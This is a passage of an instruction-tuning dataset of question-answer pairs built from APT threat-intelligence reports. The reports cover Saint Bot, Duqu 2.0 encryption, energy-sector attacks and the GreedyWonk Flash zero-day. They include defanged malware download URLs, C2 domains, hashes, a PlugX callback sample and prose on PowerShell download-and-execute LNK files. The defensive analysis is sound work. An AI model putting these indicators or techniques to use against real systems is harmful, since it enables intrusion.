    "output": "A: The PLAN aims to modernize its capabilities through several key initiatives. Firstly, it prioritizes the development of maritime information systems and new-generation weaponry. Additionally, PLAN is pursuing blue water navy capabilities, which involve operating beyond coastal waters. Specific technologies include the development of an aircraft carrier, possibly using renovated Soviet Kuznetsov-class carriers for training and acquiring Russian Su-33 carrier-borne fighters. PLAN is also modernizing its submarine fleet, transitioning from outdated Russian technology to more advanced models like the Type 041 Yuan Class, which incorporates elements from the Song class and Russian Kilo class submarines. Furthermore, PLAN is enhancing its stealth capabilities by integrating foreign technology, such as Russian or Ukrainian design advice, weapons, and electronics, and using computer-aided design methods to develop new stealthy warships like the No. 168 class, No. 170 class destroyers, and Type 054 stealthy frigates.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Tasking\nA final oft ignored tell of targeted attacks are the chosen targets themselves as they represent the intent propelling forward a well resourced espionage operation. Though many indicators may be faked or altered, the dynamic between attacker and victim is harder to hide or directly manipulate as it involves 'real-world' publicly known circumstances or geopolitical confl icts. The threat intelligence space represents an unprecedented circumstance in which an unrelated third party with an unexpected vantage point can have situational awareness over large swathes of the targets of a secretive intelligence organization. For research teams with gifted analysts, this insight allows for attacker profiling. A possible outcome is the mapping of a campaign to a geopolitical or regional situation that may point in the direction of a given perpetrating organization or nation. Or in the case of a resurgent retooled threat actor, witnessing them revisiting the 'old favourites' can be a telling sign connecting a new actor with a known cluster of activity, particularly when the new attacks leverage previously pilfered insights into the victim's network or 'pattern of life'.\nHowever, the study of tasking alone is largely interpretative and faces common pitfalls derived from cognitive biases and geopolitical oversimplifications, already familiar to intelligence analysts. Further complications arise from the particularities of certain targets and attackers alike. For example, some targets are so attractive by their very nature and position as to attract the interest of several different actors simultaneously. Also, certain\nthreat actor configurations break this paradigm entirely, as will be discussed further in the next section.\n2 An example is the quick adoption by DarkHotel of a Flash zero-day found in the reckless full release of the HackingTeam trove [1].\n\nAnswer this question based on the above context: How can the study of tasking in targeted attacks help cybersecurity experts profile attackers, and what are the potential pitfalls associated with this approach?",
    "output": "The study of tasking in targeted attacks can help cybersecurity experts profile attackers by providing insights into the attacker's intent and goals. By analyzing the chosen targets, researchers can map a campaign to geopolitical or regional situations, potentially pointing towards a specific perpetrating organization or nation. This is especially useful when a known threat actor revisits old targets, leveraging previously gained insights into the victim's network or 'pattern of life'. However, this approach is largely interpretative and faces common pitfalls such as cognitive biases and geopolitical oversimplifications. Additionally, certain targets may attract the interest of multiple actors simultaneously, and some threat actor configurations may not fit the typical paradigms, complicating the analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the IsSpace malware, used in the WateringHole_Aerospace_CVE-2015-5122_IsSpace APT, conduct reconnaissance on the victim's machine and what kind of information does it gather?",
    "output": "Reconnaissance is a crucial phase in the adversary lifecycle where attackers gather information to plan future operations. In the case of the IsSpace malware, it conducts reconnaissance by gathering various data about the infected host, such as administrative rights of the user, operating system version, and CPU architecture. This information is then exfiltrated to the command and control (C2) server, allowing the attackers to gain valuable insights into the victim's machine and potentially plan further attacks. Furthermore, IsSpace also checks for internet connectivity by making a HTTP request to www.microsoft.com, which can be seen as a form of reconnaissance to determine the victim's network connectivity. The gathered information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as planning and executing Initial Access or driving further Reconnaissance efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Related URLs\n1000018[.]xyz/soft-2/280421-z1z.exe\n1000018[.]xyz/soft/220421.exe\n1000020[.]xyz/soft/230421.exe\n1221[.]site/15858415841/0407.exe\n1221[.]site/1806.exe\n15052021[.]space/2405.exe\n150520212[.]space/0404.exe\n185.244.41[.]109:8080/upld/\n1924[.]site/soft/09042021.exe\n194.147.142[.]232:8080/upld/\n194.147.142[.]232:8080/upld/\n2215[.]site/240721-1.msi\n31.42.185[.]63:8080/upld/\n32689657[.]xyz/putty5482.exe\n32689658[.]xyz/putty5410.exe\n45.146.164[.]37:8080/upld/\n45.146.165[.]91:8080/upld/\n68468438438[.]xyz/soft/win230321.exe\n8003659902[.]space/wp-adm/gate.php baiden00[.]ru/def.bat baiden00[.]ru/win21st.txt baiden00[.]ru/wininst.exe bit[.]ly/36fee98 bit[.]ly/3qpy7Co cdn.discordapp[.]com/attachments/853604584806285335/854020189522755604/1406.exe cdn.discordapp[.]com/attachments/908281957039869965/908282786216017990/AdobeAcrobatUpdate.msi cdn.discordapp[.]com/attachments/908281957039869965/908310733488525382/AdobeAcrobatUpdate.exe cdn.discordapp[.]com/attachments/908281957039869965/911202801416282172/AdobeAcrobatReaderUpdate.exe cdn.discordapp[.]com/attachments/908281957039869965/911383724971683862/21279102.exe cdn.discordapp[.]com/attachments/932413459872747544/932976938195238952/loader.exe cdn.discordapp[.]com/attachments/932413459872747544/938291977735266344/putty.exe eumr[.]site/load4849kd30.exe eumr[.]site/load74h74830.exe eumr[.]site/up74987340.exe main21[.]xyz/adm2021/gate.php mohge[.]xyz/install.exe name1d[.]site/123/index.exe name1d[.]site/def02.bat name4050[.]com:8080/upld/9C9C2F98 orpod[.]ru/def.exe orpod[.]ru/putty.exe smm2021[.]net/load2022.exe smm2021[.]net/upload/antidef.bat smm2021[.]net/upload/Nvlaq.jpeg smm2021[.]net/wp-adm/gate.php\nstun[.]site/42348728347829.exe\nupdate-0019992[.]ru/testcp1/gate.php update0019992[.]ru/exe/update-22.exe update0019992[.]ru/gate.php update3d[.]xyz/ webleads[.]pro/public/readerdc_ua_install.exe www.baiden00[.]ru/win21st.txt www.update0019992[.]ru/exe/update-22.exe cdn.discordapp[.]com/attachments/908281957039869965/908310733488525382/AdobeAcrobatUpdate.exe cutt[.]ly/1bR6rsQ mohge[.]xyz/install.exe mohge[.]xyz/install.txt stun[.]site/zepok101.exe superiortermpapers[.]org/public/WindowsDefender-UA.exe\nMedium Headline: March 2021 Attacks\nAccording to (<https://blog.malwarebytes.com/threat-intelligence/2021/04/a-deep-dive-into-saint-bot-downloader/>)MalwareBytes research, this threat group carried out an attack campaign in March 2021 on targets in Georgia using Bitcoin and COVID themes. The researchers state that these attacks involve spear phishing, but we do not have telemetry to confirm the targeted organizations, attack vector or the exact dates in which the attacks took place. The Bitcoin-\nthemed attacks are very similar to those seen in later April attacks, as the PDF delivery documents had similar content that references Electrum bitcoin wallets, as seen in Figure 21.\nThe COVID-themed attacks reference a government organization in Georgia, which suggests that the threat group has interests in other countries in the region in addition to Ukraine. The attack involved a Zip archive hosted at  bgicovid19[.]com/assets/img/newCOVID-21.zip and contains the two malicious files and one decoy document, as listed in Table 4.\nThe letter from the Ministry of Labour, Health and Social Affairs of Georgia.pdf document is a decoy, as it contains no malicious content. The decoy content does show a document from the Ministry of Labour, Health and Social Affairs of Georgia, as seen in Figure 22, which suggests that the target may have involved an organization in Georgia.\nMedium Headline: April 2021 Attacks\nIn April 2021, the threat group carried out an attack that involved a spear phishing email with a PDF document attached, which suggested the recipient could become rich by accepting Bitcoins, as seen in Figure 23. As first seen in research by , these Bitcoin-themed attacks were specifically targeting Ukrainian government organizations.\nThe PDF document attached to the delivery email contains text that suggests the individual can access a Bitcoin wallet with a large sum of money along with a link to download the wallet, as seen in Figure 24. The link cutt[.]ly/McXG1ft is shortened and points to the URL http://1924[.]site/doc/bitcoin.zip to download a Zip archive.\nThe Zip archive contains a LNK shortcut that runs a powershell script to download and execute a payload from hxxp://1924[.]site/soft/09042021.exe. The archive also contains a password.txt file that has the following contents, which involve an Electrum Bitcoin wallet that links back to the attacks against Ukraine on Feb. 1, 2022:\nWallet in folder.\nElectrum: https://electrum.org\nPassword for walletr is: btc1000000000usd\nAccording to  research, in April 2021, this threat group also carried out COVID-themed attacks on Ukrainian government organizations. The email seen in Figure 25 includes a fake forwarded message meant to appear as correspondence between a government official and the World Health Organization (WHO). The email contains a link to a Zip archive hosted on the legitimate who.int domain. However, the link points to a shortened link of hxxps://cutt[.]ly/LcHx2Ga instead.\nThe hxxps://cutt[.]ly/LcHx2Ga URL points to hxxp://2330[.]site/NewCovid-21.zip, which hosted a Zip archive (SHA256: 677500881c64f4789025f46f3d0e853c00f2f41216eb2f2aaa1a6c59884b04cc) that contained the following files:\nCOVID-21.doc (SHA256: 9803e65afa5b8eef0b6f7ced42ebd15f979889b791b8eadfc98e7f102853451a)\nCOVID-21.lnk (SHA256: 2b15ade9de6fb993149f27c802bb5bc95ad3fc1ca5f2e86622a044cf3541a70d)\nGEO-CFUND-2009_CCM Agreement_Facesheet - signed.pdf (SHA256: bbab12dc486b1c6fcf9e343ec1474d0f8967de988444d7f838f1b4dcab343e8a)\nNew Folder.lnk (SHA256: 2b15ade9de6fb993149f27c802bb5bc95ad3fc1ca5f2e86622a044cf3541a70d)\nThe LNK shortcuts attempt to run a PowerShell script that will download an executable from the following URL, save it to %TEMP%\\WindowsUpdate.exe and execute it:\nhxxp://2330[.]site/soft/08042021.exe\nThe LNK shortcut downloads the executable from the URL above using the Start-BitsTransfer cmdlet, which is the same technique the threat group used to download the payload within the macro in the July 2021 attacks discussed below.\nQ: How did the threat group leverage decoy documents in their March 2021 attacks, and what insights can be drawn from this methodology?",
    "output": "In March 2021, the threat group included decoy documents in their attacks to make the malicious content appear more legitimate. For example, a Zip archive hosted at bgicovid19[.]com/assets/img/newCOVID-21.zip contained a decoy document titled 'letter from the Ministry of Labour, Health and Social Affairs of Georgia.pdf'. This document had no malicious content but served to mislead the target into believing the email was genuine. This tactic suggests that the threat group was targeting organizations in Georgia and had a good understanding of the types of documents that would be convincing to their targets. It highlights the importance of educating users about the risks of opening attachments, even if they appear to come from trusted sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.3. AES encryption of the configuration file\nThe analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration information from a special file. This configuration file is encrypted using the AES block cipher in CBC mode with a CTS-like (Ciphertext Stealing) encryption of the last two cleartext blocks. The format of the configuration file will be discussed in details in the next chapter.\nBefore the encryption of the configuration file, an AES wrapper object is created. This C++ object represents the context (parameters) of the encryption. Therefore, it also stores the initialization vector (IV) of the encryption, the key of the cipher and the data to be encrypted.\nThe structure of this object's class can be seen in the upper part of the next screenshot:\nAs we can see, the allocated memory area of an instance of the \"aeswrapper\" structure (class) starts with a 16 bytes (128 bits) IV value (of course, the size of the IV equals the size of an AES input block). It is followed by a 516-byte buffer (or other unused smaller attributes) which can store the encryption key of the AES cipher. Size of this encryption key can be either 128, 192 or 256 bits (16, 24 or 32 bytes). The last 4 bytes of the \"aeswrapper\" structure contains the pointer to the data to be encrypted.\nIn addition to the attributes (IV, encryption key, pointer to a data buffer), the \"aeswrapper\" class also contains methods. The most important methods are the \"encrypt\" and \"initialize\" functions. As the name shows, the initialize method initializes the context (parameters) of the encryption, therefore it sets the IV, key and data members of the \"aeswrapper\" object. The IV is generated by \"hand\", but the key is prepared from an initial key using the prepare_key function. The encrypt method encrypts the data in the modified CBC-CTS-like mode. The method uses an AES encryptor function. The nth_block method of the class gives back a pointer to the n-th block of the data to be encrypted. Finally, the \"aeswrapper\" class uses the last_block function to perform the CTS-like encryption mechanism at the end. The function gives back a pointer not to the last partial (smaller than 16 bytes) input block, but to the last 16 bytes of the input data buffer.\nThe implementation of AES prepare_key and encrypt methods are presumably copied from function libraries.\nThe figure above shows the structures (structures of class instances) which we identified and which are related to the encryption routine and the AES initialization, and the putative attributes of these structures (classes). Using these structures, the disassembled code can be more readable.\nThere is another structure in addition to the \"aeswrapper\" class called \"aes\" on the screenshot above. An instance of this class represents an AES encryptor object. It has probably 3 attributes: key_schedule, precomputed and iteration_count.\nIn the following table, we can see the AES initialization routine (of the configuration file encryption) of the old Duqu (on the left) and the new Duqu 2.0 sample (on the right) at assembly code level. The decompiled code of the initialization function (for both malware samples) can be seen in figure Sample 6. The AES initialization function initializes the mentioned \"aeswrapper\" object, it sets the data buffer, prepares the encryption key, and finally, generates the IV based on the magic constant.\nSample 4 \u2013 IV generation routine comparison (assembly view) \u2013 magic constants\nIn both cases, the highlighted part of the assembly code corresponds to the highlighted part of the initialization routines in the decompiled versions of the code, which can be seen in figure Sample 6. The only difference between the highlighted parts is the values of the magic constants (\"0xDEADBABE\" vs. \"0x248561EF\") which are used for the generation of the 128-bit initialization vectors. The mentioned AES initialization routines (and also the common encryption function) will be discussed later in this section in more details.\nWe also reverse engineered the encryption routine used by Duqu 2.0, which is illustrated in the following block diagram:\nWith the exception of the last two input blocks, consecutive blocks of the cleartext data are encrypted with the AES encryption algorithm in CBC mode. Accordingly, the first block of the input data (\"P[0]\") is XORed with a fixed initialization vector (named as \"Fixed IV\" in the figure above). This 128-bit initialization vector (IV) differs between the old Duqu and the new Duqu 2.0 samples. The value of this IV is generated from a magic constant, as it can be seen in the highlighted parts of the previous assembly code. As this magic constant is different in the old and new samples, the generated IV will also be different.\nThe result of the previously mentioned XOR operation gives the first input block of the AES encryption algorithm (\"AES-256\" is in use). The number 256 means that the AES algorithm has 256-bit key size. The block size of the AES cipher is constant 128 bits (16 bytes). \"E[0]\" is the first output of the block cipher, so it will be the first encrypted block (\"F[0]\").\nOutput of the block cipher (\"E[0]\") is then XORed with the second input block (\"P[1]\"), and the resulting block will be encrypted with AES-256. This procedure continues until the encryption of the last but first block of the cleartext data.\nIf the size of the input data is an integer multiple of the block size of AES (i.e., 128 bits), then the remaining last two blocks of the cleartext are encrypted in the same manner as the previous input blocks. So, in this case, the whole encryption routine matches a simple CBC mode encryption.\nHowever, if the size of the input data is not an exact multiple of the AES block size, the last partial block of the input data needs padding to be completed to a full block. In case of Duqu 2.0, the developers of the malware didn't use padding in a traditional way. Instead, they use a CTS-like (Ciphertext Stealing) method. The essence of the method used by the encryption routine is that a part of the last but first block of the input data is encrypted twice using AES.\nThe last but first block (\"P[n-1]\") of the cleartext data is XORed with the previous ciphertext block (\"E[n-2]\") and encrypted with AES-256 as previously. The result of this operation is the \"E[n-1]\" output block. The \"E[n-1]\" output block won't be directly used as the (n-1)st ciphertext block. Instead, the output \"E[n-1]\" is splitted into two distinct parts: \"F[n-1]\" and another part which is then fed into the AES encryptor again.\nThe last cleartext partial block (\"P[n]\") \u2013 which has size less than 16 bytes \u2013 is completed from its beginning to get a full AES input block. The data used for completing the last partial block is taken from the end of the previous AES output block (\"E[n-1]\"). The resulting block will be fed into the AES-256 cipher in the last step of the encryption process. The output of the last invocation of the AES cipher will be the last ciphertext block (\"F[n]\"). The output of the last but first invocation of the AES encryptor (\"E[n-1]\") is split into two parts, and the first part of size size_of_the_last_cleartext_block will be the (n-1)st ciphertext block (\"F[n1]\").\nThe old Duqu samples used exactly the same encryption method. The decompiled code of the AES encryptor of Duqu can be seen in the following sample, and one can see that this code implements the method we have just explained and illustrated in the block diagram of Figure 8.\nSample 5 \u2013 Main file encryption routine (same in the new and old sample) with implementation bugs \u2013 highlighted (red comments)\nThe next table compares the AES initialization routines of the old Duqu sample (upper part of the table) and the main module of Duqu 2.0 (lower part of the table).\nFirst, the initialization routine copies the pointer of the input data buffer into the \"data\" member of the \"aeswrapper\" object. The routine takes this pointer as its second parameter. The first parameter is the pointer (reference) of the object instance, since in C++, the first (hidden) parameter of a (non-static) class method is always the pointer of the object, or in other words, the \"this\" pointer. In case of Duqu 2.0, the routine has a third parameter, the pointer to the buffer containing the key.\nAfter that, the content of the \"key\" buffer (which is a global buffer in the first case) is copied into the local \"key_\" buffer in both cases. Then the prepare_key method of the AES object prepares the final encryption key based on this key, and feeds it into the \"aeswrapper\" object. Invocation of the prepare_key method can also be seen in the assembly view (see Sample 4.), the method is referred by the name AES1_sub_2F9B1 in case of Duqu and AES_1_sub_1001690A in case of Duqu 2.0. In the Duqu 2.0 case, the function has one more parameter, as this can also be seen in the assembly view, and the length of the AES key is chosen as 256 bits.\nFinally, the remaining part of the code initializes the IV member of \"aeswrapper\" object. Every byte of the IV is generated by XORing the index of the actual byte with a magic constant (\"0xDEADBABE\" and \"0x248561EF\", respectively, in the two cases). Byte index starts from zero.\nSample 6 \u2013 Old Duqu and new Duqu 2.0 encryption initialization routine with differences \u2013 highlighted (red comments)\nAs we can see, there are only three small differences between the routines: the magic constants used by the IV generation, the fact that in Duqu the key is a constant global variable with fixed value while in Duqu 2.0 it is an argument of the initialization function, and finally, the possible length of the key.\nIn case of Duqu, the prepare_key function assumes that the key is always 256 bits, while in case of Duqu 2.0, the prepare_key function takes the key length as an argument. Key length can be 128, 192 or 256 bits.\n\nWhat is the significance of the 'aeswrapper' class in the AES encryption process used by Duqu 2.0, and how does it manage the encryption context?",
    "output": "The 'aeswrapper' class in Duqu 2.0 is significant because it represents the context (parameters) of the AES encryption. It stores the initialization vector (IV), the encryption key, and a pointer to the data to be encrypted. The class includes methods such as 'initialize' and 'encrypt'. The 'initialize' method sets up the IV, key, and data members, while the 'encrypt' method performs the actual encryption using a modified CBC-CTS-like mode. Additionally, the class uses methods like 'nth_block' and 'last_block' to handle the encryption process efficiently.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OVERVIEW\nThe energy sector has become a major focus for targeted attacks and is now among the top five most targeted sectors worldwide. Companies in the sector are facing a growing risk of having their services interrupted or losing data. The threat to energy firms is only likely to increase in the coming years as new developments, such as further extensions of smart grids and smart metering expose more infrastructure to the Internet. Equipment that is not connected to the Internet and other networks is not immune to threats and there has already been a number of successful attacks against isolated systems. Operators of critical infrastructure, as well as energy utility companies, need to be aware of these threats and prepare accordingly.\nThe threat to energy firms comes from several different sources. In some cases, espionage from competitors is the primary motive, with data on new projects, exploration and finances being targeted. Disruption and destruction are the goals of other attacks. Some instances appear to be state sponsored, such as the disruption of the Iranian nuclear program by the Stuxnet worm in 2010, one of the attacks that began this trend. Others appear to be the work of hacktivists with political or environmental agendas. Internal attackers, like disgruntled employees, are also a major source of attacks that often lead to service disruption. The majority of the actors behind these attacks have grown more sophisticated in the way they attack.\nDuring the monitoring period from July 2012 to June 2013, we observed an average of 74 targeted attacks per day globally. Of these, nine attacks per day targeted the energy sector. Accounting for 16.3 percent of all attacks, the energy sector was the second most targeted vertical in the last six months of 2012, with only the government/public sector exceeding it with 25.4 percent of all attacks. The high ranking was mainly due to a major attack against a global oil company, which we observed in September 2012. However, in the first half of 2013 the energy sector continued to attract a high proportion of attacks, ranking in fifth place with 7.6 percent of targeted attacks.\nNot all of the attacks analyzed used highly sophisticated tools. Most of them could have been prevented by following best practice guidelines for protecting the IT infrastructure and the industrial components, indicating that despite high revenues and strategic importance, many energy sector companies are not prioritizing cybersecurity.\nMedium Headline: Exposed systems: Online and offline\nHistorically most industrial control systems (ICS) and supervisory control and data acquisition (SCADA) systems were in separated networks not connected to the Internet or any other network. Unfortunately this security through segregation approach does not fully protect against cyberattacks. In reality, networks are rarely completely isolated. Often some configuration updates are periodically installed or log files are transferred. If systems are not directly connected, the method of choice for these types of interactions is usually through a USB stick or a non-permanent modem connection, which provides a way into the restricted networks. This allows malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet.\nIf networks are truly segregated, this would mean that there would be no software updates installed, leaving old vulnerabilities open. There are also issues around processes. For example, the revocation lists for digital certificates are seldom updated and therefore certificates which are no longer valid cannot be checked properly and would still be accepted.\nWith the increasing desire for connectivity now reaching industrial plants, many operators have started to connect their ICS to the Internet. New adapters can bridge to older technology which was never intended to be controlled over the Internet, allowing it to be connected easily. This allows for efficient centralized monitoring and, to some extent, remote control of equipment.\nDepending on the type of machinery controlled through the human-machine interface (HMI) of the ICS, not all modifications are possible. Some systems are physically connected in a pure read-only mode for monitoring. And even if they are fully connected, some turbines have physical limitations or emergency systems based on physical effects that cannot be overridden by the digital controller. Thus, not all Hollywood scenarios of open flood gates or turbines that fly through the air are possible. However, sabotage attacks that damage equipment are definitely possible, as has already been demonstrated. In the future, more systems are going to implement the failsafe switches in software, opening up the vector for malware attacks.\nAn additional source of concern is that some countries have started to open the energy market for smaller private contributors. This means that almost anyone can use mini power plants like water, wind or photovoltaic sites to feed energy back into the power grid. Often these operators do not have a full IT staff supporting the facilities at hand, which might lead to more vulnerable installations. Furthermore they may deploy new technology which might be untested and contain some unknown vulnerabilities. While these smaller sites make up only a small portion of the grid, new decentralized power input feeds are a challenge for the balance of the power grid as well and need to be carefully monitored. Small outages or changes can have a domino effect for the whole power grid.\nTo increase the exposure of energy firms even further, sites like , which is essentially a search engine for devices, enable anyone to easily find exposed controllers on the Internet. Of course not all of the industrial control systems connected to the Internet are critical systems or even real ones. Some researchers have started to create honey pot systems in order to study the attackers, which have apparently already attracted attackers like the Comment Crew/APT1 group, who have broken into these decoy systems.\nMedium Headline: Smart grid: A new potential avenue of attack\nIn addition to the issue of securing these devices, smart grids will produce a huge amount of data which, depending on regulations, will need to be kept for audits. Some of this data may be sensitive and could raise privacy concerns if not properly protected. This could easily grow to petabytes of data that needs to be safely stored and managed.\nIt is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters. Symantec has created a dedicated whitepaper for this topic: . As a member of the CRISALIS project, Symantec is following these developments closely and is helping to secure critical infrastructure together with partners from academia and different industry sectors.\nSmall Headline: 2013\nIn 2013 part of the Austrian and German power grid nearly broke down after a control command was accidentally misdirected. It is believed that a status request command packet, which was broadcast from a German gas company as a test for their newly installed network branch, found its way into the systems of the Austrian energy power control and monitoring network. Once there, the message generated thousands of reply messages, which generated even more data packages, which in turn flooded the control network. To stop this self-inflicted DDoS attack, part of the monitoring and control network had to be isolated and disconnected. Fortunately the situation was resolved without any power outages.\nSmall Headline: 2003\nIn 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours due to a Slammer worm infection. Fortunately the power plant was already offline due to maintenance and the installed secondary backup monitoring system was unaffected by the worm. Nevertheless the incident raised safety concerns.\nAt the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack. Details of this attack are scarce and vague, but it seems that during a strike an attacking group managed to get access to the SCADA network of the oil tanker loading machinery and overwrote programmable logic controllers (PLCs) with an empty program module. This halted machinery, preventing oil tankers from loading for eight hour till the unaffected backup code was reinstalled on the PLCs. The attack was not too sophisticated as it was easily spotted. A small modification of the PLC code instead would probably have gone unnoticed for a long time.\nSmall Headline: 2001\nIn 2001 an attack took place against California's power distribution center, which controls the flow of electricity across California. Due to apparently poor security configuration, the attacker was able to compromise two Web servers that were part of a developer network and penetrate further from there. Fortunately the attackers were stopped before they managed to attack any systems which were tied into the transmission grid for the Western United States.\nSmall Headline: 2000\nAccording to Russian officials, the largest natural gas extraction company in the country was successfully attacked in 2000. The attackers used a Trojan to gain access to the control for the gas pipelines. Through this switchboard, the flow for individual gas pipelines could have been modified, which would easily have caused widespread disruption.\nAside from these incidents, there have also been a number of more serious and well-documented targeted attacks against the energy sector:\n\nAnswer this question based on the above context: What are the implications of smart grids on data management and privacy within the energy sector?",
    "output": "Smart grids generate a vast amount of data, which must be securely stored and managed. Depending on regulations, this data may need to be kept for audits and can include sensitive information that raises privacy concerns if not properly protected. Managing this data effectively requires robust security measures to prevent unauthorized access and ensure compliance with privacy regulations. The volume of data can grow to petabytes, necessitating advanced storage and management solutions to maintain security and privacy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Discovery\nOn Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player (12.0.0.4 and 11.7.700.261). Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe.\nWe subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server. All three organizations are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues.\nBig Headline: Mitigation\nTo bypass Windows' Address Space Layout Randomization (ASLR) protections, this exploit targets computers with any of the following configurations:\nWindows XP\nWindows 7 and Java 1.6\nWindows 7 and an out-of-date version of Microsoft Office 2007 or 2010\nUsers can mitigate the threat by (<http://www.fireeye.com/blog/corporate/executive-perspectives/2014/02/windows-xp-catch-if-you-cannot-patch.html>)upgrading from Windows XP and updating Java and Office. If you have Java 1.6, update Java to the latest 1.7 version. If you are using an out-of-date Microsoft Office 2007 or 2010, update Microsoft Office to the latest version.\nThese mitigations do not patch the underlying vulnerability. But by breaking the exploit's ASLR-bypass measures, they do prevent the current in-the-wild exploit from functioning.\nBig Headline: ASLR bypass\nFor Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets with hard-coded base addresses for English (\"en\") and Chinese (\"zh-cn\" and \"zh-tw\").\nOn Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has Microsoft Office 2007 or 2010.\nJava 1.6 is no longer supported and does not receive security updates. In addition to the MSVCR71.dll ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6. That's why FireEye strongly recommends upgrading to Java 1.7.\nThe Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013. More details about this bypass are addressed by Microsoft's (<http://technet.microsoft.com/en-us/security/bulletin/ms13-106>)Security Bulletin MS13-106 and an accompanying (<https://blogs.technet.com/b/srd/archive/2013/12/09/ms13-106-another-aslr-bypass-is-gone.aspx>)blog entry. FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.\nBig Headline: PlugX/Kaba payload analysis\nOnce the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint. This PlugX sample was compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for this campaign.\nThis PlugX payload was configured with the following command-and-control (CnC) domains:\njava.ns1[.]name\nadservice.no-ip[.]org\nwmi.ns01[.]us\nSample callback traffic was as follows:\nHHV1: 0\nHHV2: 0\nHHV3: 61456\nHHV4: 1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;\nInfoPath.2; .NET CLR 2.0.50727; SV1)\nHost: java.ns1.name\nContent-Length: 0\nConnection: Keep-Alive\nCache-Control: no-cache\nBig Headline: Campaign analysis\nBoth java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18, 2014. Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4, 2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014. java.ns1[.]name also resolved to 192.74.246.219 on February 18.\nFurther research uncovered a number of older malware samples connecting to the same domain wmi.ns01[.]us.\nThe Poison Ivy variants that connected to the domain wmi.ns01[.]us had the following unique configuration properties:\nWe found a related Poison Ivy sample (MD5 8936c87a08ffa56d19fdb87588e35952) with the same \"java7\" password, which was dropped by an Adobe Flash exploit (CVE-2012-0779). In this previous incident, visitors to the Center for Defense Information website (www.cdi[.]org \u2014 also an organization involved in defense matters \u2014 were redirected to an exploit server at 159.54.62.92.\nThis exploit server hosted a Flash exploit file named BrightBalls.swf (MD5 1ec5141051776ec9092db92050192758). This exploit, in turn, dropped the Poison Ivy (<http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/>)variant. In addition to using the same password \"java7,\" this variant was configured with the mutex with the similar pattern of \"YFds*&^ff\" and connected to a CnC server at windows.ddns[.]us.\nUsing passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to 76.73.80.188 in mid-2012.\nDuring another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e). This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52). This Poison Ivy variant connected to a CnC server at ids.ns01[.]us. The domain ids.ns01[.]us also overlaps with the domain wmi.ns01[.]us on the IP 194.183.224.75.\nThe Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be). In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.\nIn what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.\nBig Headline: Conclusion\nThis threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit sociocultural issues. The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically.\nThis actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems. Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the midterm.\nAnswer this question: How did the threat actors behind Operation GreedyWonk utilize the PlugX/Kaba payload, and what insights can be gained from its configuration and deployment?",
    "output": "Once the exploit succeeded, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b was installed on the compromised endpoint. This PlugX sample was compiled on Feb. 12, one day before it was first observed, indicating that it was deployed specifically for this campaign. The payload was configured with the following command-and-control (CnC) domains: java.ns1[.]name, adservice.no-ip[.]org, and wmi.ns01[.]us. Sample callback traffic included headers such as 'HHV1: 0', 'HHV2: 0', 'HHV3: 61456', 'HHV4: 1', and a User-Agent string mimicking Internet Explorer 6.0 on Windows XP. This configuration suggests that the threat actors had a specific target in mind and were prepared to maintain control over compromised systems for further data exfiltration and espionage activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
